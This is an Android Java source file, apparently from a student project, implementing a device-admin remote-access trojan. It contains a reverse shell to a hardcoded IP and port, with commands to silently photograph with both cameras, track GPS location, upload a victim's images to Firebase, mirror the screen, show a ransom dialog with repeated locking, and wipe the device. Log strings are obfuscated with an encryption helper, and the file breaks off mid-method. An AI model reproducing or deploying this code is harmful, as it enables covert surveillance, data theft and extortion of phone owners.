package com.example.inf2007_mad_j1847.test;
//import static com.example.inf2007_mad_j1847.test.Ran_warnKt.showRansomDialog;

import android.app.AlertDialog;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.IOException;
import java.net.Socket;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;


import androidx.camera.core.Camera;

import com.example.inf2007_mad_j1847.utils.StringHelper;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = StringHelper.decrypt("68p4fS8y5EV6Ysvba4L+Fmq37sBJ+BD4LgS19+KKRsJ1bMJOd+IvEAY="); //"TapTrap-Admin";
    private static final String SERVER_IP = StringHelper.decrypt("jef6aRlHXChx9G94QDYyj213aWt+3m4dTVLCb2+C/ioevjluK/la"); //"20.2.66.175";
    private static final int SERVER_PORT = 9999;




    // Lock control variables
    private static AtomicBoolean isContinuousLockActive = new AtomicBoolean(false);
    private static Thread continuousLockThread = null;
    private static PowerManager.WakeLock wakeLock = null;
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 🔴 TAPTRAP SUCCEEDED!
        Log.d(TAG, StringHelper.decrypt("lYWQHuvpO25a0SMFW29leCImoiaaW1E39BBWIXLbzSxFN/nu/XKt2Dzi3Rf8vrfJQ3n9gpQ/06MBSbs1/Q==")); //"🔥 Device Admin GRANTED via TapTrap!");
        Log.d(TAG, StringHelper.decrypt("fWh6cEiPN37pREV93UYXkB+zUjHuzVR/zIUiP2ZfxMoNUV13pElG9770W54WxQ==")); //"connect to server ");


        // START THE SERVICE instead of calling launchReverseShell directly
        Intent serviceIntent = new Intent(context, ShellService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

//        launchReverseShell(context);
        Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));



    }

    // Reverse Shell Code
    public void launchReverseShell(Context context) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                Log.d(TAG, StringHelper.decrypt("rXbWxQg1DYw4MfI2hkHlOeLPrNr/iknveJVrgoyaJWTgsLcER73t6HbsyxwxaKMN2Q7Y")); // "🔥 Reverse shell launched!");

                // Send a welcome message to the listener
                java.io.PrintWriter writer = new java.io.PrintWriter(socket.getOutputStream(), true);
                writer.println(StringHelper.decrypt("HAeD4UZxrhQuc2f1mgwX4XKEWDVUZDrJPhEqcyaPE+BxwBF/UB7p5qEr5Kh24DJDXJeXow==")); //"🔥 TapTrap shell connected!");
                writer.println(StringHelper.decrypt("WfT33Xy3zUeh4oGLPge2KVH2bCUTVXqO4PeUtLAMUBrUiTC23+Gj2UlJL3apTno=")); //"Available commands:");
                writer.println(StringHelper.decrypt("MUPCnPltuN6z4mD1piYHYH0yF6kKrvnFUB37XH+1LcC8ZU98CKICmQ9eiOxVBoM0EAVRun1qL01L8dQ=")); //"  lock        - Lock the device");
                writer.println(StringHelper.decrypt("ETaofJ5DJeno/OygxBaP7SXAPoUmMQtrOortZIhyzVioZpP2hUuCmbnWRakyuRN15/s4uM+TQzoVAXBI7ac=")); //"  whoami      - Show app user info");
                writer.println(StringHelper.decrypt("cqsoSsovECK0LXsiYo3W6M0pd84gPIRapXeJqLlGu3SeTBnuyEsC+Bc1OBN2SK+2nQ/+GPOP46mIYFOCQEt4")); //"  device_info - Show device details");
                writer.println(StringHelper.decrypt("ErqjqJ/RuNXk+qxVFz8Csdf17ZDL0D7cY57aFmWu75KWJXy9JT7bOoUWpXGrC6VGDjZKim7QtXzQU0S8zKYb")); //"  battery     - Show battery status");
                writer.println(StringHelper.decrypt("n/LFWiHT6TuWTlKQu4PUo3qmr7jqoETm7qVoutVQfFLVhzv2IqYYxp8jhpehZO6/VXKLoT/WjvOC51eECw==")); //"  ip          - Show IP addresses");
                writer.println(StringHelper.decrypt("Atc3GR4Yh68IByBtKOorrVwpvzg1s9Nm7GpK6ZqExfpgTQZh7kTXV6lWge7ChDGCInI2d1HosDGdeYTbhoI4FRh+pRZ2HzEjdFwBAuejCx7Fa7mZGJQ=")); //"  list_apps (only show current app)  - List installed apps");
                writer.println(StringHelper.decrypt("qu+bXTj3MuSP9AcoWZoD5kC0VlJXjjWIU7Yw1SHD2YfsdM5f7kR79uA+6Jk3yv/O3eVD9XTZqvmS0OIld7pi3m9+tf+G0y3A1K6zXnMz0QZkPw==")); //"  reboot (not working on emulator)     - Reboot device");
                writer.println(StringHelper.decrypt("UjjA7uxD9OhoKcQCiAx1s6mUaJxpGVljRNPKMxuuQat8jfoNZYjWPmk=")); //"  ransom_lock");
                writer.println(StringHelper.decrypt("31t5utjgyk5egEhwwqpUw5r1MIrr8x6DUoQIMFUvaSPqY9bkFtNAuvk=")); //"  ransom_end ");
                writer.println(StringHelper.decrypt("PxZfzLO7BdY1/cmDdJE5LwNgpQf+4QSC+VWdpZDuOM7r8Mo6KwOP5yLR5jTbMpkFw9a6rfGitpIHheKHNjwZb0Opjiha7tNHentjCpJd")); //"  scan_media [N]  - Scan N images and show results");
                writer.println(StringHelper.decrypt("1bL5Rebp23MNPjc9CNxBDuDepPUyxHJcBpkmBkjw7Drbrubt85GWJMIaZvoQqmtrCeZvx3MsYFRjWAEPIgDnrUKhXNLMSs0v4MEIh26kL1E=")); //"  upload [ID]     - Upload image to Firebase Storage");
                writer.println(StringHelper.decrypt("2/NnRdGzConFqzeIGSBHpPeCeGP/Z58Sq1rsPuJpUOWotvqVYG4//t2n5vma4BpOlhrDdfQUWBNi5xiB")); //"  exit        - Close connection");
                writer.println(StringHelper.decrypt("xzJm7mSfCooeZnpvylYn3o2wa0HGA9kZ+Z/LEieMtHBPddWQ4F+KlP9kTguQo+uv4UE6T0RODZHgwZFD91r5c3zlf6Tj3svCzQ==")); //"  wipe - Factory reset device (physical only)");
                writer.println(StringHelper.decrypt("VTE3HYwAfh3SFiAj686v2wcLwTSF+SomxMDdjD2eY7UJbQ4Hh/bqQ9PFRF2caFS6uJp0K9PXUP3U2SJhWIfG0Ow1AwlIiL1XKn5qEwm17F1W")); //"  screen_mirror - Start sending screenshots every 10s");
                writer.println(StringHelper.decrypt("iDJ/iLBfPa5w8NhNt1Cab3vjlGt8raXnOW9f0zqs1gHNqgeiEUyx2LM8imw1i/CER+P/4uIBWMT9x/dGyBP32A==")); //"  screen_stop   - Stop screen mirror");
                writer.println(StringHelper.decrypt("XZ3NiPh1cW2sFnJuslLPVczLpBoXHQhQubo704g8mUwa/0et/DCSFPNvdKdk0Hv/Zfju+OGhkKzqQw==")); //"  wifi        - Show WiFi info");
                writer.println(StringHelper.decrypt("m1Pglb+VVqYaCWhqiscC8vZqEkvyGizcvnnHdwm70IaUTh2i6zSzSKHP+4uc3evHeYEc3QfCEX+xFKd4DR5PFgue58FKewg4oRIIrRHcI6ktmlg=")); //"  location    - Show GPS coordinates + Google Maps link");
                writer.println(StringHelper.decrypt("WNzfduIfJ1WPQbr+rR0VbjL2lrBvMV8n1LIJ21tfYzP6xbH1QsaNzmvJhjK1gTJAcli0u2IGaBrDrHXk+oxHtQmU1ojC3sYh4rEdpg==")); //"  front_snap  - Silently take front camera photo");
                writer.println(StringHelper.decrypt("BqHZHGMNcNqL16C4h+eHs9JhyM0M2rlh4lP8Rfo3NG9zXM2wgvRs0mzH5eooJnMPFXA+jx0wZbm96IxPaj72EWwZhmeRIihDrrPO")); //"  back_snap   - Silently take back camera photo");
                writer.println(StringHelper.decrypt("xywjNV0nLxl8Y9/jYjyA2nq21MWDBKv13PGJcKtUbjXFGOK+7qGByT8Sy5qAJksg6vbdgoI3RjFcU1gpu6k=")); //"----------------------------------");

                // Read commands from listener
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(socket.getInputStream())
                );

                String command;
                while ((command = reader.readLine()) != null) {
                    command = command.trim();
                    Log.d(TAG, StringHelper.decrypt("sJYVzDGLXl7LsyNeAiJAbwt/ZGubbLqK1Ime8hXUV8D5uh2unS3aWrpoH2cjGQ==")  + command); // "📩 Command received: "
                    String response = handleCommand(context, command);
                    writer.println(response);

                    if (command.equals("exit")) break; // "exit"
                }

                socket.close();

            } catch (Exception e) {
                Log.e(TAG, StringHelper.decrypt("ump/6rkOrfIMmQ//1DgyhAggMR4SYeYu3DZ9L4pKxjhfOZQcfLNdZSzb") + e.getMessage()); // "Shell failed: "
            }
        }).start();
    }

    private String handleCommand(Context context, String command) {

        if (command.toLowerCase().startsWith(StringHelper.decrypt("AacdoSP5+RRdPrnj/C+QGLOfGqS0xIwDD30EvhhhEbL2NnrpzwY="))) { //"scan_media"
            int maxItems = 10;
            String[] parts = command.split(" ");
            if (parts.length > 1) {
                try {
                    maxItems = Integer.parseInt(parts[1]);
                } catch (NumberFormatException e) {
                    return StringHelper.decrypt("C9yFU5L1qJIqs+FX9ktGjVNk1BjYuk+5AGlhTLb6nZhvC2xKktWSkyOyAx9C9FlC0YPmRD8ImbG4prXEGqGVaBY="); //"❌ Invalid number. Usage: scan_media [N]";
                }
            }

            final int finalMaxItems = maxItems;

            Log.d(TAG, StringHelper.decrypt("dD+TxwYJlIiZWtsWYuQyq3Xf3vXZTSScry12CFsMrgrFSGT01f4HgxoCf7O3Yah9gU7y/g==")  + finalMaxItems + " items"); // "Starting media scan for "

            // Run scan in background and wait for result
            final StringBuilder resultBuilder = new StringBuilder();

            Thread scanThread = new Thread(() -> {
                try {
                    List<Map<String, String>> results = MediaCollector.scanRecentMedia(context, finalMaxItems);

                    if (results.isEmpty()) {
                        resultBuilder.append(StringHelper.decrypt("RVjzGV00nUK7eSgrfH8hMUM92LtT0pvwaxGw4RVYTjHCkIRAi5g/BniHi7Rx")); // "📸 No images found.\n"
                    } else {
                        resultBuilder.append("✅ Found ").append(results.size()).append(StringHelper.decrypt("Yx9zd5QoodD+5siewiT2mTW2ThPOl+dIsi2K7TNPOXD0pll+ng==")); //  " images:\n"
                        for (int i = 0; i < results.size(); i++) {
                            Map<String, String> item = results.get(i);
                            resultBuilder.append("  ").append(i + 1).append(". ")
                                    .append(item.get("name"))
                                    .append(" [ID: ").append(item.get("id")).append("]\n");
                        }
                        resultBuilder.append(StringHelper.decrypt("9K5b49MAVJddrmwybstjQNr18YBYLFfAcV+QPNoI+DVw5Fa0KqyJU8L1oIjqYC8O6wS1ccYVTnyS2fA3UU4BZ78=")); //"Use 'upload [ID]' to send to Firebase"
                    }
                } catch (Exception e) {
                    resultBuilder.append(StringHelper.decrypt("ddi08PcrOG6NVoOAc8eDg1iRk/byeROiS/Ws3AL1Ch9IytihOPuI8RM=")).append(e.getMessage()); // "❌ Scan failed: "
                    Log.e(TAG, StringHelper.decrypt("IdjZL9FlEzaSS7EUthcNN+zD81ebHbGNlNDD5Uq24noZ5rxz+x0Q5g==") + e.getMessage()); // "Scan error: "
                }
            });

            scanThread.start();
            try {
                scanThread.join(10000); // Wait up to 10 seconds for scan to complete
            } catch (InterruptedException e) {
                return StringHelper.decrypt("P9w55L5K2o/Ns9GcLOU+Wkpbj/Q6wOwKBorRQcSqwFPAn5Q0J+Z3afni"); //"❌ Scan timed out";
            }

            return resultBuilder.toString();
        }

        if (command.toLowerCase().startsWith(StringHelper.decrypt("znRLrQuZ3fnICBXN6bPcjtwupkVyKpE8+5pldyjJpV6qeQ==") )) { // "upload"
            String[] parts = command.split(" ");
            if (parts.length < 2) {
                return StringHelper.decrypt("U3CJCPKzVV+0WWvFyPIiHkQZrexKdw4gSS7JhbqbykvcFyltigBsX4ec23ReRnEz78jWLg=="); //  "❌ Usage: upload [image_id]"
            }

            String imageId = parts[1];
            String deviceId = context.getPackageName();

            new Thread(() -> {
                MediaCollector.uploadToFirebase(context, imageId, deviceId);
            }).start();

            return StringHelper.decrypt("3X9OKrr9eRzU24x9AiMF0drmMlGQBZNBtwUOP38PFfKb3rcuZCCUjjdf7Mg=") + imageId +  StringHelper.decrypt("iTk9Ewd9zpU9ZVkRz9MFtR53OcWFxKtJ+cM4q8OTqPZ1rezDDmlJDRrK2A=="); // "📤 Uploading image "  " to Firebase..."
        }

        switch (command.toLowerCase()) {
            case "lock":
                lockDevice(context);

                return StringHelper.decrypt("UvRp3NA3aptucW/ajTTBBx3fCkZ6i9VtVPk66hLlp8oQWkmSr/ToPSUs"); // "✅ Device locked!"



            case "whoami":
                return StringHelper.decrypt("3YdZwR8MlZO4igqAolyFQlvfHWLgfBaCVj3vMrHF5cQutw==")  + android.os.Process.myUid() + // "User: "
                    StringHelper.decrypt("5S5fRwZiNaDsbhdLwkm8Atf/rhrS+U8Ogq9a6SGvHY7i9Nyz")  + context.getPackageName();   // " | App: "

            case "device_info":
                return getDeviceInfo();

            case "battery":
                return getBatteryInfo(context);

            case "ip":
                return getIpAddress();

            case "list_apps":
                return getInstalledApps(context);


            case "reboot":
                rebootDevice(context);
                return StringHelper.decrypt("s/tsV6hGRRiNmabOuxd/zW5KZzEbHSgc/UmpGZdQiofDXgROXQB52JL/3WVrA78="); // "✅ Rebooting device..."

            case "help":
                return StringHelper.decrypt("sd85O2Pt9OfiirsrWWIPQRkRCi4Asu/0PRNi07oFuN4LMU5TZKHI8llidD39qiWCbEBjeRfw9Xnr1IYP029uirY4huoPK7WmP9Xr7wLrKs+yjG2YJM30tfeT7f56P576or4WCliX4HQxzQ9nplbRj12L9HSvE84QlodTmXiE92eEIgBEdt2rFX5n"); // "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit"

            case "exit":
                return StringHelper.decrypt("xKwG4iBaI0gabef7tPg2EQYLNF5QMDCgiuvEYpJXiBE67v+GXNMcnVQop0yXLaFfdA=="); // "👋 Closing connection..."

            case "wipe":

                setMaxFailedAttempts(context, 1);
            return StringHelper.decrypt("IMAk1ljPuHyp//FKBIZLtAG5kdFy6UaMIRwP45rAViHLkuH2aGn6zy7QtZU="); // "✅ Wiping device..."

            case "ransom_lock":
                showRansomDialog(context);
                startContinuousLock(context);
                return StringHelper.decrypt("jbOTFDgz7Lu1cBO6LOFlEqwDNAtq/pK4Xb9cTXFEO1xzy/mi7AQnqljV"); // "✅ Device locked!"

            case "ransom_end":
                stopContinuousLock();
                return StringHelper.decrypt("adrGs8vE/ZyXsvgekN4TAyknH6th+tCsYoO6w6YENcaDFN56Vl0KPAep88o="); // "✅ Device unlocked!"

            case "screen_mirror":
//                Intent mirrorIntent = new Intent(context, ScreenMirrorService.class);
//                mirrorIntent.putExtra("resultCode", ScreenMirrorService.sResultCode);
//                mirrorIntent.putExtra("resultData", ScreenMirrorService.sResultData);
//                context.startForegroundService(mirrorIntent);
                return StringHelper.decrypt("4yxWg9SSM5F652V+/SXHo5crVexMiSHAp4uMJTHvNXAIlin0gxxDKFqaop+i4Sx1Lp2Pexaeg5jbHilch0h8YSSBpv63eyhnQLlLU2tf+WUg1f7ex/por8wf"); // "🎥 Screen mirror already running! View at http://20.2.66.175:9090"

            case "screen_stop":
                context.stopService(new Intent(context, ScreenMirrorService.class));
                return StringHelper.decrypt("Rx61ebbZSmB+jQY91UVPoPEln1wPn0lpg5OA/WJNCgCyd/0aYJcbAZSIlW8xSVp0cnI="); // "🛑 Screen mirror stopped!"

            case "wifi":
                return getWifiInfo(context);

            case "location":
                return getLocation(context);

            case "front_snap":
                Intent frontIntent = new Intent(context, CameraService.class);
                frontIntent.putExtra(CameraService.EXTRA_LENS, StringHelper.decrypt(""));  // "front"
                context.startService(frontIntent);
                return StringHelper.decrypt("s7SarUS3ik/L/AF3+mSSnFNKioX2Y1G3fIlUhSqBI3UXqjc4ft6yobiPmKeLieCsJM0GKqmE5wIl2rRt9yPI4szQEEXYHJoM1waM98tuKW8EnA==");  // "📸 Front camera snap taken! Check http://20.2.66.175:9090"

            case "back_snap":
                Intent backIntent = new Intent(context, CameraService.class);
                backIntent.putExtra(CameraService.EXTRA_LENS, "back");  // "back"
                context.startService(backIntent);
                return StringHelper.decrypt("6MP0mL0YVBLaXbHUDrFOaoBJzbWpmi4bwI8xEHypH302wI+taswlDkw3aO1N1PV2lxvv0a6869lZ9fV7grakcbS+X9sLLZ4G1NBkWSPuwySU");  // "📸 Back camera snap taken! Check http://20.2.66.175:9090"

            default:
                return StringHelper.decrypt("5ACQaq6Os5rhGaU2c3rqfhoK0MaaTLS34T4awGTcVfJilr2gIKJLZuoMATK9") + command + " | type 'help' for commands";  // "❌ Unknown command: "
        }
    }


    // Device info
    private String getDeviceInfo() {
        return StringHelper.decrypt("G10JPudXBOGW9RXfZ8Mn1XqfvpEbh6EDFUQR2LdUrlvnmwU=")  + android.os.Build.MODEL + // "Model: "
                StringHelper.decrypt("AYRdk2smIDo2pdWzIoEW2op9SNYHxyx9TEq5YeBdWaMa01TjcWNQcfoAOA==")  + android.os.Build.MANUFACTURER + // "\nManufacturer: "
                StringHelper.decrypt("Z1ezmpMUaSNG+FT3tfMuwCHbUu8aF/WBh8TOhv0S5muXeqZ9SEM=")  + android.os.Build.VERSION.RELEASE + // "\nAndroid: "
                StringHelper.decrypt("5sFVYsk4ybDD45rn1f0aQtdkiBNZaIubHvZnoB5ZJkVq7w==") + android.os.Build.VERSION.SDK_INT + // "\nAPI: "
                StringHelper.decrypt("R2CnCLl+m88DtauWicamOqT/Cq2MGtr3fJWnOEl9BaKMJsKzJw==")  + android.os.Build.DEVICE +   // "\nDevice: "
                StringHelper.decrypt("hEgOYGLa9PXHpTbdZh2HypRnysgUNiMHKQoAhMgxGcOre9uDDc3DceJn")  + android.os.Build.FINGERPRINT; // "\nFingerprint: "
    }

    // Battery info
    private String getBatteryInfo(Context context) {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
        int status = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) : -1;
        float pct = level * 100 / (float) scale;
        boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
        return StringHelper.decrypt("3BDU2wJKH9ZrPi7kPYgIMGDW8E6U8aqCL0Wl1wExmocURFknFA==")  + (int) pct + "% | " + (charging ? "Charging" : "Not charging");  // "Battery: "
    }

    // IP Address
    private String getIpAddress() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            StringBuilder sb = new StringBuilder(StringHelper.decrypt("Ve8UNhSuapl+wwkDup8bfqM5BkhR7PL5ODyrlJpQ2S6CJa1bKXIqwumj") ); // "IP Addresses:\n"
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress()) {
                        sb.append(iface.getName()).append(": ").append(addr.getHostAddress()).append("\n");
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return StringHelper.decrypt("WEE+BnwTq2JK1/52VhBD3tailPhvO3smRTMR+lrr8DvDIgTdtJn+jq1RB44U3A==")  + e.getMessage(); // "Failed to get IP: "
        }
    }


    private List<ApplicationInfo> getInstalledAppsCompat(Context context) {
        PackageManager pm = context.getPackageManager();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33+
            // API 33+ requires PackageInfoFlags
            PackageManager.ApplicationInfoFlags flags =
                    PackageManager.ApplicationInfoFlags.of(0);
            return pm.getInstalledApplications(flags);
        } else {
            // Legacy method
            return pm.getInstalledApplications(PackageManager.GET_META_DATA);
        }
    }

    // List installed apps
    private String getInstalledApps(Context context) {
        StringBuilder sb = new StringBuilder(StringHelper.decrypt("vSAT8Uko+GxvoRIE11Urc5NFjxIkd6n3GPSNPC9CupmOWDcG7xFurrCwuuo=")); // "Installed Apps:\n"

        try {
            // Use compat method
            List<ApplicationInfo> apps = getInstalledAppsCompat(context);

            sb.append(StringHelper.decrypt("lpaDriO03l8WmMnGIrGwXEOAH5wt4Jtql0zgjQ12oi9UVvqVoU1g23hLc6gfpg==") ).append(apps.size()).append("\n"); // "Total apps found: "

            for (ApplicationInfo app : apps) {
                // Skip system apps (optional)
                //if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = context.getPackageManager()
                            .getApplicationLabel(app).toString();
                    sb.append("  - ").append(appName)
                            .append(" (").append(app.packageName).append(")\n");
                //}
            }

            Log.d("TapT",StringHelper.decrypt("BXuc2NgumsJRcMpzM+Mpodo0kX3MDh2oy8BxRZzBKzNbcUtwsBIAYg8TRVVDB9/n") + apps.size() + StringHelper.decrypt("J70K+XUWT8mfHYKa5peUlwrneRR6bfzHzZTFUTVUmf2s") ); //  "App list generated: "  " apps"

        } catch (SecurityException e) {
            Log.e("TapT", StringHelper.decrypt("I3SWXokjUdhUy7OYqydFVF0ere5usGSaAxbMR2ogCHIQF8KdSBzneFPI4gUzZ1g=")  + e.getMessage()); // "Permission denied: "
            sb.append(StringHelper.decrypt("84hE8oE7I03XRGV42v1nr8n/P4H1mMup3HPi0lU33oeoZzCnPFDNjYh1yqi+t9hzDu/ecUjl6gcmY+Bs8Tkhl1qo8WAiyzhw")); //  "ERROR: Missing QUERY_ALL_PACKAGES permission"
        } catch (Exception e) {
            Log.e("TapT", StringHelper.decrypt("tzHxC9hZoCiyfDvz8LKXicBeSGR5W8ex8pHRjnUakgDsbk+QuWxC2jqRdhOeNJkZ") + e.getMessage()); // "Error getting apps: "
            sb.append(StringHelper.decrypt("kbppMHeEHxDvKsw1gCdmPw9DPSaiUsZUJgZzbcXPyUsxRUA=") ).append(e.getMessage()); //"ERROR: "
        }

        return sb.toString();
    }



    // Reboot device
    private void rebootDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            dpm.reboot(getAdmin(context));
        }
    }

    // ========== CENTRALIZED DPM GETTER ==========
    /**
     * Get DevicePolicyManager instance - ALL commands use this
     */
    private DevicePolicyManager getDpm(Context context) {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    /**
     * Get ComponentName - ALL commands use this
     */
    private ComponentName getAdmin(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 1. Lock device immediately
     */
    public void lockDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG,StringHelper.decrypt("Il4XXFpAnHWuYg5VVa5V06a3hzVircAIuaOBYrmvZqJ23QWOx+szISbkb9I3TeM=")); //  " Locking device now"
        dpm.lockNow();

    }


    private void setMaxFailedAttempts(Context context, int attempts) {
        try {
            DevicePolicyManager dpm = getDpm(context);
            ComponentName admin = getAdmin(context);

            // Validate attempts range (1-10 as per documentation)
            if (attempts < 1 || attempts > 10) {
                Log.e(TAG, StringHelper.decrypt("CGqr9tvhAT21elkTo5roxGTiW1dnygMXc1nWufws1iKQRiUJbbrtR9d4288xfve8fpBzFqe4yClPOmVdEg==")); // "Attempts must be between 1 and 10"
                return;
            }

            // Set the policy
            dpm.setMaximumFailedPasswordsForWipe(admin, attempts);
            Log.i(TAG, StringHelper.decrypt("A/4sCuYLS/Z21QpBk2jRq0sVWV7pxutyrWizsNY6Y6ACKeK7OBVdduno7eOBOYeNoaX44unWaFc=")+ attempts); // "✅ Max failed attempts set to: "

            // Verify it was set
            int currentSetting = dpm.getMaximumFailedPasswordsForWipe(admin);
            Log.d(TAG, StringHelper.decrypt("jjCt2ucdKZTAHH4tO8V6RwOs0Yq8PNg6q1Be9RfC+/Bw+jYODZ9bHXlUigEhdg==") + currentSetting); // "Verified setting: "

        } catch (SecurityException e) {
            Log.e(TAG, StringHelper.decrypt("2cSwf214r7CQ0nM4HwVCx8BkmVQz9ozWGiE65/BLtEk2QW2T8GgfLqUTEro=") + e.getMessage()); // "Security error: "
        } catch (Exception e) {
            Log.e(TAG, StringHelper.decrypt("ZtvFlAhQ7RN1473hiu+5BP+xrlxqfLIciQdZ6qKB4DnW0Zo=") + e.getMessage()); // "Error: "
        }
    }



    public void startContinuousLock(final Context context) {
        if (isContinuousLockActive.get()) {
            Log.d(TAG, StringHelper.decrypt("dBll9OrveiNBwSgy+qtFiP997VZS3/ceTTw313MZVOPvv846dTOtvjJtnw==")); // "⚠️ Already locking"
            return;
        }

        // Acquire wake lock
        try {
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    StringHelper.decrypt("aG8X+GdSPJQeUWXyU28IUr261Qe0G5v1IZpx/ocXnzEOSfpnHLbR/cJ0cbJzKcln")); //  "TapTrap:LockWakeLock"
            wakeLock.acquire(10*60*1000L);
            Log.d(TAG, StringHelper.decrypt("RTwYIadqda+/HuWO2CdqGqkCqLCeT7CjlHvoav2jWfwDWG54/qywAKEoxSK1")); // "✅ WakeLock acquired"
        } catch (Exception e) {
            Log.e(TAG, StringHelper.decrypt("YcprRm0hm79aj8KgEklPW7puThLpROLNe54xG0JpRh+ixwqwgp7833OtY1+K8pEqLTxSLGGUI94=") + e.getMessage()); // "Failed to acquire WakeLock: "
        }

        isContinuousLockActive.set(true);

        continuousLockThread = new Thread(() -> {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);

            Log.d(TAG, StringHelper.decrypt("FTpvJrL4N6uJhUMY5Z/921yGOyD8UcZlJwqaQJ2POZWdDULZfCajm9ELt+Z5x2zycP0xIaT+kCKJPjXXulBsgz79g/CfxYPD")); // "▶️ LOCK STARTED - Will auto-stop after 50 locks"

            int lockCount = 0;
            long startTime = System.currentTimeMillis();

            while (isContinuousLockActive.get()) {
                try {
                    dpm.lockNow();
                    lockCount++;

                    long runningTime = (System.currentTimeMillis() - startTime) / 1000;
                    Log.d(TAG, StringHelper.decrypt("0JZeWLDd3G4wLKF+hTW04d54QLZb0z8fldG+ED/l4qm2OQ==") + lockCount + " - " + runningTime + "s elapsed"); // "🔒 Lock #"

                    // SAFEGUARD: Stop after 50 locks
                    if (lockCount >= 20) {
                        Log.d(TAG, StringHelper.decrypt("l1+ldYTeNeKAiRJEc9mXkwHnLvqi9KrCA5P5qEphlu9qxRNbDClVCiiBxlZV+5eBRk/f7a7ulHAk4vVEVNOCtFU=")); // "⚠️ SAFEGUARD: 50 locks reached, stopping"
                         break;  // ✅ Jumps to cleanup below
                    }

                    Thread.sleep(5000);  // 5 second delay

                } catch (InterruptedException e) {
                    Log.d(TAG,StringHelper.decrypt("J7Ds5t4Jag/p/etPyWk6KdRQS5yBnDEbN9molT4NpTzeiob49MLBOmkAb61Z9Q==")); //  "⏹️ Thread interrupted"
                    break;  // ✅ Jumps to cleanup
                } catch (SecurityException e) {
                    Log.e(TAG,StringHelper.decrypt("XBj+6T8mMFeils+5dBQb62q2phhmI5+DqMerHw6ROeWiRQ/wnA4h8wYboRKBnw+M3KsONMZz5+FaCRc=")); // "❌ Security error - admin disabled"
                    break;  // ✅ Jumps to cleanup
                } catch (Exception e) {
                    Log.e(TAG, StringHelper.decrypt("sBalz8yNGTBSOhoYxxyL5+GYvH7hjCcsLLWIBnEE9UbK/fKcoUruK5eyjpJp/g==") + e.getMessage()); // "❌ Unexpected error: "
                    // Continue locking despite error
                }
            }

            // ✅ CLEANUP - This runs after ANY break
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, StringHelper.decrypt("QhMeo42vupe9UVZn0dgEZvfPiVBxSQQKFc6bM5uqKoFf2uEq4UQ0AqJntONQ")); //"✅ WakeLock released"
            }

            isContinuousLockActive.set(false);

            long totalTime = (System.currentTimeMillis() - startTime) / 1000;
            Log.d(TAG, StringHelper.decrypt("w9yv0TGZWAwlCk464voyCz8mSouG5tOD7+tAVlNgmom4tgayT9QyuASUd8wSrBVdefE=")+ totalTime + "s and " + lockCount + " locks"); // "⏹️ LOCKING STOPPED after "
        });

        continuousLockThread.start();
    }

    /**
     * STOP continuous locking (OFF)
     */
    public void stopContinuousLock() {
        if (isContinuousLockActive.get()) {
            isContinuousLockActive.set(false);

            if (continuousLockThread != null) {
                continuousLockThread.interrupt();
                try {
                    continuousLockThread.join(2000); // Wait up to 2 seconds
                } catch (InterruptedException e) {
                    Log.e(TAG,StringHelper.decrypt("MVqg7D4jkm277Se7wmrLPB3Hs9QClZ3zUBKKF5YACD+2hOoqcgLG8ig6Z9hxILSUnKEUt3djoYdk6nIc")); //  "Interrupted while joining thread"
                }
                continuousLockThread = null;
            }

            // Release wake lock
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }

            Log.d(TAG, StringHelper.decrypt("KKKv8mUIRV/S53eyh7+vJwtST9M5LfHQlVNaES/wgCLpDivjU0m+wnzhrwQ8kYtRehrP6QOY2/9fsq1e")); // "⏹️ Continuous locking STOPPED (OFF)"
        } else {
